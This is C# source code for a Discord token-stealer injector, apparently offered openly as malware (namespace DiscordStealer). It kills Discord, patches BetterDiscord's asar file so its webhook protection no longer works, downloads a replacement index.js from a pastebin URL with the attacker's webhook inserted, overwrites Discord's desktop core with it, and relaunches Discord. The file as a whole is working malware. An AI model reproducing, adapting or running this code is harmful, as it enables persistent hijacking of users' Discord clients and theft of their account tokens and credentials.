using Program;
using System;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Security;
using System.Security.Permissions;
using System.Text;

namespace DiscordStealer
{
	
	internal class Program
	{
		
		private static void Main(string[] args)
		{
			string path = Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) + "\\" + Environment.UserName;
			foreach (Process process in Process.GetProcesses())
			{
				if (process.ProcessName.Contains("iscord"))
				{
					process.Kill();
				}
			}
			if (Program.BetterDiscordExists())
			{
				foreach (string text in Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\BetterDiscord\\data"))
				{
					if (text.EndsWith("betterdiscord.asar"))
					{
						try
						{
							Program.RemoveBetterDiscordProtection(text);
						}
						catch { }
					}
				}
			}
			foreach (string text2 in Directory.GetDirectories(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData)))
			{
				if (text2.Contains("Discord"))
				{
					foreach (string path2 in Directory.GetDirectories(text2))
					{
						if (Directory.GetDirectories(text2).Count<string>() > 0)
						{
							foreach (string text3 in Directory.GetDirectories(path2))
							{
								if (text3.Contains("app-"))
								{
									string[] directories3 = Directory.GetDirectories(text3);
									for (int l = 0; l < directories3.Length; l++)
									{
										foreach (string text4 in Directory.GetDirectories(directories3[l]))
										{
											if (text4.Contains("discord_desktop_core"))
											{
												try
												{
													Directory.CreateDirectory(text4 + "\\IDK");
												}
												catch { }
												foreach (string text5 in Directory.GetFiles(text4))
												{
													if (text5.Contains("index.js"))
													{
														string newContent = new WebClient().DownloadString("https://pastebin.com/raw/JGYENyMQ").Replace("REPLACE_ME", Settings.webhook);
														File.WriteAllText(text5, newContent, Encoding.UTF8);
													}
												}
											}
										}
									}
								}
							}
						}
					}
				}
			}
			foreach (string text6 in Directory.GetDirectories(path))
			{
				if (text6.Contains("Discord"))
				{
					foreach (string path3 in Directory.GetDirectories(text6))
					{
						if (Directory.GetDirectories(text6).Count<string>() > 0)
						{
							foreach (string text7 in Directory.GetDirectories(path3))
							{
								if (text7.Contains("app-"))
								{
									string[] directories5 = Directory.GetDirectories(text7);
									for (int num = 0; num < directories5.Length; num++)
									{
										foreach (string text8 in Directory.GetDirectories(directories5[num]))
										{
											if (text8.Contains("discord_desktop_core"))
											{
												try
												{
													Directory.CreateDirectory(text8 + "\\IDK");
												}
												catch { }
												foreach (string text9 in Directory.GetFiles(text8))
												{
													if (text9.Contains("index.js"))
													{
														string newContent = new WebClient().DownloadString("https://pastebin.com/raw/JGYENyMQ").Replace("REPLACE_ME", Settings.webhook);
														File.WriteAllText(text9, newContent, Encoding.UTF8);
													}
												}
											}
										}
									}
								}
							}
						}
					}
				}
			}
			string[] files2 = Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Microsoft\\Windows\\Start Menu\\Programs\\Discord Inc");
			for (int num2 = 0; num2 < files2.Length; num2++)
			{
				Process.Start(files2[num2]);
			}
		}

		
		private static void RemoveBetterDiscordProtection(string betterdiscordpath)
		{
			string hex = "6170692f776562686f6f6b73";
			string hex2 = "7374616e6c65796973676f64";
			bool replaceAllInstances = true;
			if (File.Exists(betterdiscordpath))
			{
				PermissionSet permissionSet = new PermissionSet(PermissionState.None);
				FileIOPermission perm = new FileIOPermission(FileIOPermissionAccess.Write, betterdiscordpath);
				permissionSet.AddPermission(perm);
				if (permissionSet.IsSubsetOf(AppDomain.CurrentDomain.PermissionSet))
				{
					byte[] array = File.ReadAllBytes(betterdiscordpath);
					byte[] array2 = hex.HexStringToBytes();
					byte[] array3 = hex2.HexStringToBytes();
					if (array2 != null && array2.Length != 0 && array3 != null && array3.Length == array2.Length && array != null && array.Length >= array2.Length && Program.ReplaceBytes(ref array, array2, array3, replaceAllInstances) > 0)
					{
						File.WriteAllBytes(betterdiscordpath, array);
					}
				}
			}
		}

		
		private static bool BetterDiscordExists()
		{
			return Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\BetterDiscord\\data");
		}

		
		private static int ReplaceBytes(ref byte[] inBytes, byte[] matchBytes, byte[] replaceBytes, bool replaceAllInstances = false)
		{
			int num = matchBytes.Length;
			int num2 = 0;
			int num3 = 0;
			for (int i = 0; i < inBytes.Length; i++)
			{
				if (inBytes[i] == matchBytes[num2])
				{
					num2++;
					if (num2 == num)
					{
						Program.ReplaceByteRange(ref inBytes, replaceBytes, i - (num2 - 1));
						num3++;
						if (!replaceAllInstances)
						{
							return 1;
						}
						num2 = 0;
					}
				}
				else if (num2 > 0)
				{
					num2 = ((inBytes[i] == matchBytes[0]) ? 1 : 0);
				}
			}
			return num3;
		}

		
		public static void ReplaceByteRange(ref byte[] bytes, byte[] replaceBytes, int start)
		{
			for (int i = 0; i < replaceBytes.Length; i++)
			{
				bytes[start + i] = replaceBytes[i];
			}
		}

		
		[Flags]
		private enum ExitCodes
		{
			Success = 0,
			NotEnoughArguments = -1,
			TargetFileNotFound = -2,
			AdministrativeRightsRequired = -4,
			MatchAndReplaceLengthMismatch = -8
		}
	}
}
